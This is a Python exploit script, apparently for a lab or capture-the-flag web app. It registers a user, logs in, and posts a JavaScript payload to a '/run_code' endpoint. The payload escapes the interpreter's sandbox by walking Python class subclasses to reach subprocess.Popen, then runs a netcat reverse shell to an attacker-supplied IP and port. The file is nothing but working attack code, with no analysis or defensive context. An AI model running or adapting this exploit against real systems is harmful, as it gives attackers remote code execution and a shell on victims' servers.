#!/usr/bin/env python3

import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--url", help="Target URL", required=True)
parser.add_argument("--lhost", help="Attacker IP", required=True)
parser.add_argument("--lport", help="Attacker Port", required=True)
parser.add_argument("--username", help="Username", required=True)
parser.add_argument("--password", help="password", required=True)
args = parser.parse_args()

proxy = {'http':'http://127.0.0.1:8080'}

payload = f"""
let cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {args.lhost} {args.lport} > /tmp/f"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({{}})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {{
    let result;
    for(let i in o.__subclasses__()) {{
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {{
            return item
        }}
        if(item.__name__ != "type" && (result = findpopen(item))) {{
            return result
        }}
    }}
}}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
"ok";
"""
def register():
    data = {'username':args.username,
            'password':args.password
            }
    r = requests.post(args.url + '/register', data=data, proxies=proxy)
    if r.status_code == 200:
        print("[+] User registered successfully")
    else:
        print("[-] Registration Failed with status code: ", r.status_code)


def login():
    s = requests.Session()
    data = {'username':args.username,
            'password':args.password
            }
    r = s.post(args.url + '/login', data=data, proxies=proxy)
    if r.status_code == 200:
        print("[+] Logged in successfully")
    else:
        print("[-] Login failed with status code: ", r.status_code)

    return s


def exploit():
    s = login()
    cookies = s.cookies
    headers = {"Content-Type": "application/json"}
    exp = {"code":payload}
    r = s.post(args.url + '/run_code', json=exp, cookies=cookies, headers=headers, proxies=proxy)
    if r.status_code == 200:
        print("[+] Payload Sent successfully, check listener")
    else:
        print("[-] Exploit failed with status code: ", r.status_code)


register()
exploit()
